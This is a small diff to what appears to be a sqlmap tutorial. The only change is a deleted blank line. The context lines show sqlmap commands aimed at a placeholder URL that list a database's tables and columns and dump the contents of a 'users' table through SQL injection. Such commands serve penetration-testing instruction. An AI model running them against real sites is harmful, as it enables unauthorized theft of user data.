@@ -12,6 +12,5 @@ $ python sqlmap.py -u "http://www.site.com/section.php?id=51" --tables -D safeco
 #### Get columns of a table
 $ python sqlmap.py -u "http://www.site.com/section.php?id=51" --columns -D safecosmetics -T users
 
-
 #### Get data from a table
 $ python sqlmap.py -u "http://www.site.com/section.php?id=51" --dump -D safecosmetics -T users
